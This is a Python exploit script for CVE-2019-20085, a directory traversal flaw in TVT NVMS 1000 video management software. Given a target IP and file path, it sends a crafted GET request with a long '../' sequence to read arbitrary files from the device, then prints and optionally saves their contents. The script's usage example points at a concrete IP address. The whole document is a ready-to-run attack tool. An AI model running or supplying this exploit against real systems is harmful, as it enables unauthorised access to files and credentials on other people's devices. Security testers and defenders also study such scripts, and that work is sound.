#!/usr/bin/python3
# Title:            NVMS 1000 - Directory Traversal Attack
# CVE:              CVE - 2019-20085
# Date:             15 April 2020
# Author:           @AleDiBen
# Vendor Homepage:  http://en.tvt.net.cn/
# Software Link:    http://en.tvt.net.cn/products/188.html
# Original Author:  Numan Türle

import sys
from urllib3 import HTTPConnectionPool
import time
import re

rgxip = re.compile("^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$")

class bcolors:
    HEADER = '\033[34m'
    OK = '\033[32m'
    WARN = '\033[33m'
    ERR = '\033[31m'
    END = '\033[0m'

def usage():
    print(bcolors.HEADER, end="")
    print("****************************************************************")
    print("**                      ~CVE 2019-20085~                      **")
    print("****************************************************************")
    print(bcolors.END)
    print("USAGE  :\n\t./nvms.py <TARGET_IP> <TARGET_FILE> [OUT_FILE]")
    print("EXAMPLE:\n\tpython nvms.py 195.135.100.10 Windows/system.ini win.ini\n")
    
def isint(string):
    try:
        int(string)
        return True
    except:
        return False

def parse_input(args):
    _local_path = None
    _ip = args[0]
    _target_file = args[1]
    iperr = False

    if(len(args)==3):
        _local_path = args[2]
    
    split = _ip.split('.')
    for x in split:
        if not isint(x):
            iperr = True
        elif int(x) > 255:
            iperr = True
    
    if(rgxip.match(_ip) == None or iperr):
        print(bcolors.ERR + "[-]" + bcolors.END + " Please insert a valid IP Address")
        exit(-1)
    
    _url = "http://"+_ip+"/"
    return _url, _ip, _target_file, _local_path


if(len(sys.argv[1:]) < 2):
    usage()

else:
    url, ip, target_file, local_path = parse_input(sys.argv[1:])

    traversal = "/../../../../../../../../../../../../../../"
    headers = {
        'Host':ip,
        'User-Agent':'customUserAgent',
        'Accept':'*/*',
        'Referer':url,
        'Content-Length':'2'
    }
    
    try:
        pool = HTTPConnectionPool(host=ip, port=80)
        res = pool.request('GET', traversal + target_file, headers)
        data = res.data.decode('utf-8')
    except:
        print(bcolors.ERR + "[-]" + bcolors.END + " Host not reachable!")
        exit(-1)

    if res.status == 200:
        print(bcolors.OK + "[+]" + bcolors.END + " DT Attack Succeeded")
    
        if(local_path != None):
            print(bcolors.OK + "[+]" + bcolors.END + " Saving File Content")
            f = open(local_path, "w")
            f.write(data)
            f.write("\n")
            f.close()
            print(bcolors.OK + "[+]" + bcolors.END + " Saved")
        
        print(bcolors.OK + "[+]" + bcolors.END + " File Content\n")
        print(bcolors.WARN, end="")
        print("++++++++++ BEGIN ++++++++++")
        print(data)
        print("++++++++++  END  ++++++++++")
        print(bcolors.WARN)

    else:
        print(bcolors.ERR + "[-]" + bcolors.END + " Host not vulnerable!")

exit(0)
